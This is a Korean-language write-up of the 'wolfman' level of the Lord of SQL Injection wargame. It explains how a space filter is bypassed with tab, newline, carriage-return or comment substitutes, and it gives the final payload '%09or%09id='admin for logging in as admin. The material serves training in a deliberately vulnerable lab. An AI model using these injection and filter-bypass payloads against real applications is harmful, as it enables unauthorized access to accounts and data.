---
title: LOS - 5번 wolfman
category: Lord of SQL Injection
---

# [05] wolfman

## 문제
<img  src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FbFoJny%2Fbtrm82gU3RC%2FdeJNraK8yM7BkOkUOlEtik%2Fimg.png">

## 풀이
preg_match로 공백 문자를 필터링하고 있음을 알 수 있다.

따라서 쿼리문 삽입 시 공백을 적절한 문자로 대체해주어야 한다.

<br>
 
먼저, solve 조건은 다음과 같다.


```python
if($result['id'] == 'admin') solve("wolfman");
```


fetch된 레코드의 id가 admin일 시 문제가 풀리게 됨을 알 수 있다.

<br>

다음은 쿼리문을 보겠다.


```python
$query = "select id from prob_wolfman where id='guest' and pw='{$_GET[pw]}'";
```

admin을 fetch 해주려면

싱글쿼터로 pw를 닫아준 후,

**or id='admin**' 으로 id가 admin인 레코드를 뽑아주면 된다.

<br>

즉, 주입해야할 쿼리문은 다음과 같다.


```
' or id='admin
```

<br>
 
그런데 이 문제에서는 파라미터에 공백이 포함되어있을 시 접근을 제한하고 있기 때문에,

앞서 인지했던 것처럼 공백을 다른 문자로 대체해주어야 한다.

<br>

**공백 필터링 우회**를 위한 적절한 대체 문자의 예시는 다음과 같다.


1. Tab : %09

2. \n : %0a

3. \r : %0d

4. 주석 : /**/

5. 그 외

<br>

이 중 Tab을 선택해 최종 주입할 쿼리문을 정했다.


```
'%09or%09id='admin
```

## 결과
<img  src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FdqzwKS%2FbtrmY5fpiKW%2FqOnb4odHpy19ov8szVsPk1%2Fimg.png">